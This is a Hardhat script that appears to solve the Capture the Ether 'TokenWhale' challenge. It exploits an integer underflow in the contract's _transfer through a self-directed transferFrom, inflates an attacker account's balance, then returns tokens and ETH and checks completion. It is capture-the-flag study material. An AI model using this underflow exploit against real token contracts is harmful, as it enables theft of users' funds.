const { ethers } = require("hardhat");

async function main() {
  const { deployer, mallory } = await ethers.getNamedSigners();

  const tokenWhale = await ethers.getContractAt(
    "TokenWhaleChallenge",
    "0x8CdaB90dE2a1D30047c6Ecc57A9e934262A1a0Ce"
  );

  console.log("Funding mallory account...");
  await deployer
    .sendTransaction({
      to: mallory.address,
      value: ethers.utils.parseEther("1"),
    })
    .then((tx) => tx.wait());

  console.log("Approving mallory...");
  await tokenWhale
    .approve(mallory.address, ethers.constants.MaxUint256)
    .then((tx) => tx.wait());

  console.log("Calling transferFrom...");
  await tokenWhale
    .connect(mallory)
    .transferFrom(deployer.address, deployer.address, 1) // _transfer underflow
    .then((tx) => tx.wait());

  console.log("Fetching mallory balance...");
  const tokenBalance = await tokenWhale.balanceOf(mallory.address);

  if (tokenBalance >= 1000000) {
    console.log(`Tranferring to deployer...`);
    await tokenWhale
      .connect(mallory)
      .transfer(deployer.address, tokenBalance.sub(1001))
      .then((tx) => tx.wait());
  } else {
    console.error("Balance was less than expected");
  }
  const ethBalance = await mallory.getBalance();
  const rawTxn = { to: deployer.address, value: ethBalance };
  const txnRequest = await mallory.checkTransaction(rawTxn);
  const gas = await mallory.estimateGas(txnRequest);
  const gasPrice = await mallory.getGasPrice();
  txnRequest.value = ethBalance.sub(gas.mul(gasPrice.add(100)));

  console.log("Transferring Eth back to deployer...");
  await mallory.sendTransaction(txnRequest).then((tx) => tx.wait());

  console.log("isComplete:", await tokenWhale.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
